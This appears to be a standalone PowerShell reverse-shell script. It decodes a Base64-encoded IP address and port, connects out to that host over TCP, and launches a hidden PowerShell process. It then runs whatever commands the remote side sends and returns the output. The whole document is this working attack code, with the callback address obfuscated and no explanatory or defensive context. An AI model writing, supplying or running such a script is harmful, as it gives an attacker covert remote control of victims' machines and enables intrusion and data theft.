# Decode IP address from Base64
$ipBytes = [System.Convert]::FromBase64String("Encoded Base64 IP Address")
$ip = [System.Text.Encoding]::ASCII.GetString($ipBytes)

# Decode port from Base64
$portBytes = [System.Convert]::FromBase64String("Encoded Base64 Port")
$portStr = [System.Text.Encoding]::ASCII.GetString($portBytes)
$port = [int]$portStr

try {
    # Create TCP client and connect
    $tcpClient = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $tcpClient.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    
    # Start the PowerShell process without redirection parameters
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $psi
    $process.Start() | Out-Null
    
    # Get streams
    $inputStream = $process.StandardInput
    $outputStream = $process.StandardOutput
    $errorStream = $process.StandardError
    
    # Function to read available output
    function Get-ProcessOutput {
        $output = ""
        while ($outputStream.Peek() -ne -1) {
            $output += $outputStream.ReadLine() + "`n"
        }
        while ($errorStream.Peek() -ne -1) {
            $output += $errorStream.ReadLine() + "`n"
        }
        return $output
    }
    
    # Send initial prompt
    $writer.WriteLine((Get-ProcessOutput))
    
    # Loop to handle commands and output
    while ($tcpClient.Connected -and -not $process.HasExited) {
        # Read command from network client
        $command = $reader.ReadLine()
        if ($command -eq $null) {
            break
        }
        
        # Send command to the PowerShell process
        $inputStream.WriteLine($command)
        
        # Give the process time to execute
        Start-Sleep -Milliseconds 100
        
        # Collect and send output back to client
        $output = Get-ProcessOutput
        $writer.WriteLine($output)
    }
    
    # Cleanup resources
    $inputStream.Close()
    $outputStream.Close()
    $errorStream.Close()
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $tcpClient.Close()
    
    if (-not $process.HasExited) {
        $process.Kill()
    }
    $process.Dispose()
}
catch {
    Write-Error "An error occurred: $_"
}
